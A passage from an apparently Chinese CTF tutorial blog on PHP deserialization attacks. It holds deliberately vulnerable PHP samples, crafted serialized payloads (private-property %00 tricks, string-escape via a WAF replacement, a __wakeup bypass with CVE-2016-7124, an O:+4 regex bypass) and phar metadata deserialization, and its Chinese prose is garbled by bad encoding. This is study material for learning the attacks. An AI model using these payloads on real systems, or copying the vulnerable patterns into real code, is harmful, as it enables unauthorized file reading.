class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line"><span class="keyword">private</span> $file = <span class="keyword">__FILE__</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$file</span>)</span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;file = $file;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;file !== <span class="keyword">__FILE__</span>)&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;file = <span class="keyword">__FILE__</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">highlight_file(<span class="keyword">$this</span>-&gt;file);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_REQUEST[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">$file = $_REQUEST[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[OC]:\d+:/i&#x27;</span>, $file))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;hacking!!!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">@unserialize($_REQUEST[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>åºåˆ—åŒ–å¸¦privateå±æ€§çš„file</p><p><code>&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</code></p><p>å°†<code>file</code>æ”¹ä¸º<code>%00A%00file</code>ï¼Œå¯¹åº”çš„é•¿åº¦æ”¹ä¸º<code>7</code></p><p>å³ï¼š</p><blockquote><p>{s:7:â€%00A%00fileâ€;s:8:â€flag.phpâ€;}</p></blockquote><p>exp</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;test.php&#x2F;?file&#x3D;O:%2b1:&quot;A&quot;:2:&#123;s:7:&quot;%00A%00file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure><h3 id="å­—ç¬¦ä¸²é€ƒé€¸"><a href="#å­—ç¬¦ä¸²é€ƒé€¸" class="headerlink" title="å­—ç¬¦ä¸²é€ƒé€¸"></a>å­—ç¬¦ä¸²é€ƒé€¸</h3><p>åœ¨ç½‘ç«™æ ¹ç›®å½•ä¸‹æœ‰ä¸¤ä¸ªæ–‡ä»¶ï¼Œtest.phpå’Œflag.php</p><p>test.phpæºç å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">255</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $filename = <span class="keyword">__FILE__</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">highlight_file(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params">$s</span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> preg_replace(<span class="string">&#x27;/flag/i&#x27;</span>, <span class="string">&#x27;index&#x27;</span>, $s);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_REQUEST[<span class="string">&#x27;x&#x27;</span>]) &amp;&amp; is_string($_REQUEST[<span class="string">&#x27;x&#x27;</span>]))&#123;</span><br><span class="line">$a = [</span><br><span class="line"><span class="number">0</span> =&gt; $_REQUEST[<span class="string">&#x27;x&#x27;</span>],</span><br><span class="line"><span class="number">1</span> =&gt; <span class="string">&quot;1&quot;</span></span><br><span class="line">];</span><br><span class="line">@unserialize(waf(serialize($a)));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">new</span> A();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ„é€ payloadï¼š</p><p>é¦–å…ˆè¦æœ‰ä¸ª<code>&quot;;</code>ä½¿å‰é¢çš„å­—ç¬¦ä¸²é—­åˆ</p><p>æ¥ä¸‹æ¥æ˜¯å¸¸è§„çš„åºåˆ—åŒ–åçš„æ•°ç»„å…ƒç´ </p><p><code>i:0;O:1:&quot;A&quot;:1:&#123;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;&#125;</code></p><p>ä½†åœ¨waf()å‡½æ•°ä¸­ï¼Œå¯¹åºåˆ—åŒ–åçš„$aè¿›è¡Œæ›¿æ¢ï¼Œæ‰€ä»¥å°†<code>s</code>æ”¹ä¸º<code>S</code>ï¼Œå°†<code>flag.php</code>æ”¹ä¸ºåå…­è¿›åˆ¶çš„<code>\66\6C\61\67\2E\70\68\70</code>ï¼Œå³</p><p><code>i:0;O:1:&quot;A&quot;:1:&#123;s:8:&quot;filename&quot;;S:8:&quot;\66\6C\61\67\2E\70\68\70&quot;;&#125;</code></p><p>æœ€åå†åŠ ä¸Š<code>&#125;</code>ä½¿å‰é¢æ•°ç»„açš„<code>&#123;</code>é—­åˆ</p><p>æ‰€ä»¥åˆèµ·æ¥æ˜¯</p><p><code>&quot;;i:0;O:1:&quot;A&quot;:1:&#123;s:8:&quot;filename&quot;;S:8:&quot;\66\6C\61\67\2E\70\68\70&quot;;&#125;&#125;</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = [</span><br><span class="line"><span class="number">0</span> =&gt; <span class="string">&#x27;&quot;;i:0;O:1:&quot;A&quot;:1:&#123;s:8:&quot;filename&quot;;S:8:&quot;\66\6C\61\67\2E\70\68\70&quot;;&#125;&#125;&#x27;</span>,</span><br><span class="line"><span class="number">1</span> =&gt; <span class="string">&#x27;1&#x27;</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">print_r(serialize($a));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¾“å‡º</p><p><code>a:2:&#123;i:0;s:65:&quot;&quot;;i:0;O:1:&quot;A&quot;:1:&#123;s:8:&quot;filename&quot;;S:8:&quot;\66\6C\61\67\2E\70\68\70&quot;;&#125;&#125;&quot;;i:1;s:1:&quot;1&quot;;&#125;</code></p><p>æ‰€ä»¥è¯¥æ®µå­—ç¬¦ä¸²æœ‰65ä¸ªå­—ç¬¦</p><p>åˆ©ç”¨waf()å‡½æ•°å°†flagæ›¿æ¢ä¸ºindexä¼šå¢åŠ ä¸€ä¸ªå­—ç¬¦ï¼Œæ„é€ 65ä¸ªflag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c print(<span class="string">&#x27;flag&#x27;</span>*<span class="number">65</span>)</span><br></pre></td></tr></table></figure><p>å°†è¾“å‡ºç»“æœå’Œå‰é¢çš„å­—ç¬¦ä¸²æ‹¼æ¥åœ¨ä¸€èµ·ï¼Œå¾—åˆ°payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflag&quot;;i:0;O:1:&quot;A&quot;:1:&#123;s:8:&quot;filename&quot;;S:8:&quot;\66\6C\61\67\2E\70\68\70&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure><p>é™„ï¼š</p><p>éªŒè¯payloadæ˜¯å¦æ­£ç¡®</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params">$a</span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> preg_replace(<span class="string">&#x27;/flag/&#x27;</span>, <span class="string">&#x27;index&#x27;</span>, $a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = [</span><br><span class="line"><span class="number">0</span> =&gt; <span class="string">&#x27;flagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflag&quot;;i:0;O:1:&quot;A&quot;:1:&#123;s:8:&quot;filename&quot;;S:8:&quot;\66\6C\61\67\2E\70\68\70&quot;;&#125;&#125;&#x27;</span>,</span><br><span class="line"><span class="number">1</span> =&gt; <span class="string">&#x27;1&#x27;</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">print_r(waf(serialize($a)));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">print_r(unserialize(waf(serialize($a))));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¾“å‡ºç»“æœï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">a:2:&#123;i:0;s:325:&quot;indexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindex&quot;;i:0;O:1:&quot;A&quot;:1:&#123;s:8:&quot;filename&quot;;S:8:&quot;\66\6C\61\67\2E\70\68\70&quot;;&#125;&#125;&quot;;i:1;s:1:&quot;1&quot;;&#125;</span><br><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [0] &#x3D;&gt; __PHP_Incomplete_Class Object</span><br><span class="line">        (</span><br><span class="line">            [__PHP_Incomplete_Class_Name] &#x3D;&gt; A</span><br><span class="line">            [filename] &#x3D;&gt; flag.php</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&quot;print(len(&#x27;indexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindexindex&#x27;))&quot;</span></span><br></pre></td></tr></table></figure><p>è¾“å‡ºï¼š325</p><h3 id="pharååºåˆ—åŒ–"><a href="#pharååºåˆ—åŒ–" class="headerlink" title="pharååºåˆ—åŒ–"></a>pharååºåˆ—åŒ–</h3><p>(ä¸å¤ªæ‡‚pharååºåˆ—åŒ–æ€ä¹ˆç”¨ï¼Œè¿™éƒ¨åˆ†æ‘˜è‡ª<a href="https://paper.seebug.org/680/">https://paper.seebug.org/680/</a>)</p><p>pharæ–‡ä»¶æœ¬è´¨ä¸Šæ˜¯ä¸€ç§å‹ç¼©æ–‡ä»¶ï¼Œå…¶ä¸­æ¯ä¸ªè¢«å‹ç¼©æ–‡ä»¶çš„æƒé™ã€å±æ€§ç­‰ä¿¡æ¯éƒ½æ”¾åœ¨è¿™éƒ¨åˆ†ã€‚è¿™éƒ¨åˆ†è¿˜ä¼šä»¥<strong>åºåˆ—åŒ–</strong>çš„å½¢å¼å­˜å‚¨ç”¨æˆ·è‡ªå®šä¹‰çš„meta-dataï¼Œè¿™æ˜¯ä¸Šè¿°æ”»å‡»æ‰‹æ³•æœ€æ ¸å¿ƒçš„åœ°æ–¹ã€‚</p><p>æ³¨æ„ï¼šè¦å°†php.iniä¸­çš„<code>phar.readonly</code>é€‰é¡¹è®¾ç½®ä¸º<code>Off</code>ï¼Œå¦åˆ™æ— æ³•ç”Ÿæˆpharæ–‡ä»¶ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @unlink(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">    $phar = <span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//åç¼€åå¿…é¡»ä¸ºphar</span></span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//è®¾ç½®stub</span></span><br><span class="line">    $o = <span class="keyword">new</span> TestObject();</span><br><span class="line">    $phar-&gt;setMetadata($o); <span class="comment">//å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest</span></span><br><span class="line">    $phar-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span></span><br><span class="line">    <span class="comment">//ç­¾åè‡ªåŠ¨è®¡ç®—</span></span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥æ˜æ˜¾çš„çœ‹åˆ°meta-dataæ˜¯ä»¥åºåˆ—åŒ–çš„å½¢å¼å­˜å‚¨çš„ï¼š</p><p><img src="https://images.seebug.org/content/images/2018/08/ea55a494-3d8e-4bd9-9cae-e604194495b0.png-w331s" alt="img"></p><p>æœ‰åºåˆ—åŒ–æ•°æ®å¿…ç„¶ä¼šæœ‰ååºåˆ—åŒ–æ“ä½œï¼Œphpä¸€å¤§éƒ¨åˆ†çš„<a href="http://php.net/manual/en/ref.filesystem.php">æ–‡ä»¶ç³»ç»Ÿå‡½æ•°</a>åœ¨é€šè¿‡<code>phar://</code>ä¼ªåè®®è§£æpharæ–‡ä»¶æ—¶ï¼Œéƒ½ä¼šå°†meta-dataè¿›è¡Œååºåˆ—åŒ–ï¼Œæµ‹è¯•åå—å½±å“çš„å‡½æ•°å¦‚ä¸‹ï¼š</p><p><img src="https://images.seebug.org/content/images/2018/08/17c4c630-b5f7-4e02-af48-160cd8fcf73a.png-w331s" alt="img"></p><ul><li>phar_test1.php</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;Destruct called&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $filename = <span class="string">&#x27;phar://phar.phar/test.txt&#x27;</span>;</span><br><span class="line">    file_get_contents($filename); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://images.seebug.org/content/images/2018/08/7497d95b-b33f-4de8-bc5e-03890aff1bd9.png-w331s" alt="img"></p><p>å…¶ä»–å‡½æ•°å½“ç„¶ä¹Ÿæ˜¯å¯è¡Œçš„ï¼š</p><ul><li>phar_test2.php</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;Destruct called&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $filename = <span class="string">&#x27;phar://phar.phar/a_random_string&#x27;</span>;</span><br><span class="line">    file_exists($filename);</span><br><span class="line">    <span class="comment">//......</span></span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å½“æ–‡ä»¶ç³»ç»Ÿå‡½æ•°çš„å‚æ•°å¯æ§æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ä¸è°ƒç”¨unserialize()çš„æƒ…å†µä¸‹è¿›è¡Œååºåˆ—åŒ–æ“ä½œï¼Œä¸€äº›ä¹‹å‰çœ‹èµ·æ¥â€œäººç•œæ— å®³â€çš„å‡½æ•°ä¹Ÿå˜å¾—â€œæš—è—æ€æœºâ€ï¼Œæå¤§çš„æ‹“å±•äº†æ”»å‡»é¢ã€‚</p><h2 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h2><h3 id="unserialize1"><a href="#unserialize1" class="headerlink" title="unserialize1"></a>unserialize1</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">XianZhi</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $name;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">          <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;name);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    unserialize($_GET[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ„é€ åºåˆ—åŒ–ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XianZhi</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name = <span class="string">&#x27;/flag&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> XianZhi();</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//O:7:&quot;XianZhi&quot;:1:&#123;s:4:&quot;name&quot;;s:5:&quot;/flag&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/07/30/anYHMt.png" alt="anYHMt.png"></p><h3 id="unserialize2"><a href="#unserialize2" class="headerlink" title="unserialize2"></a>unserialize2</h3><p><strong>OCç»•è¿‡ã€wake upç»•è¿‡</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $file = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$file</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = $file;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;file != <span class="string">&#x27;index.php&#x27;</span>) &#123;</span><br><span class="line">            <span class="comment">//the secret is in the f15g_1s_here.php</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;file = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;var&#x27;</span>])) &#123;</span><br><span class="line">    $var = base64_decode($_GET[<span class="string">&#x27;var&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, $var)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;stop hacking!&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">        @unserialize($var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    highlight_file(<span class="string">&quot;index.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œé¦–å…ˆæœ‰ä¸¤ä¸ªè¦ç»•è¿‡çš„ç‚¹</p><p>ç¬¬ä¸€ä¸ªç‚¹æ˜¯<code>__wakeup()</code>ï¼Œå› ä¸ºè¿™é‡Œæ­£å¸¸ååºåˆ—åŒ–ä¼šå†™æ­»<code>$this-&gt;ï¬le</code>å±æ€§ä¸º index.phpï¼Œä½†æ˜¯phpå­˜åœ¨è¿™ä¹ˆä¸€ä¸ªæ¼æ´ï¼ˆCVE-2016-7124ï¼‰ï¼Œå½“å®é™…å¯¹è±¡ä¸ç­‰äºååºåˆ—åŒ–çš„å¯¹è±¡æ•°æ—¶å€™ä¼šç»•è¿‡<code>wakeup()</code>ã€‚</p><p>ç¬¬äºŒä¸ªç‚¹æ˜¯æ­£åˆ™åŒ¹é…ï¼Œè¿™é‡Œçš„æ­£åˆ™åŒ¹é…çš„æ„æ€æ˜¯å¦‚æœåœ¨varå˜é‡ä¸­å­˜åœ¨O/C:æ•°å­—(O:æ•°å­—æˆ–è€…C:æ•°å­—è¿™æ ·çš„å½¢å¼)å°±dieæ‰ï¼Œè¿™é‡ŒåŒ¹é…çš„æ˜¯<code>O:4</code>ï¼Œç›´æ¥ä½¿ç”¨+å·å½“åšç©ºæ ¼å³å¯ç»•è¿‡ï¼Œå³<code>O:+4</code>å³å¯ç»•è¿‡ã€‚</p><p>æ„é€ åºåˆ—åŒ–ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $file = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$file</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = $file;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> Demo(<span class="string">&#x27;f15g_1s_here.php&#x27;</span>);</span><br><span class="line">$a = serialize($a).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">$a = str_replace(<span class="string">&#x27;O:4&#x27;</span>,<span class="string">&#x27;O:+4&#x27;</span>,$a);</span><br><span class="line">$a  =  str_replace(<span class="string">&#x27;:1:&#x27;</span>,<span class="string">&#x27;:2:&#x27;</span>,$a);</span><br><span class="line"><span class="keyword">echo</span> base64_encode($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czoxNjoiZjE1Z18xc19oZXJlLnBocCI7fQo=</span></span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/07/30/anaal9.png" alt="anaal9.png"></p><h3 id="unserialize3"><a href="#unserialize3" class="headerlink" title="unserialize3"></a>unserialize3</h3><p><strong>ç§æœ‰å±æ€§ç»•è¿‡</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span 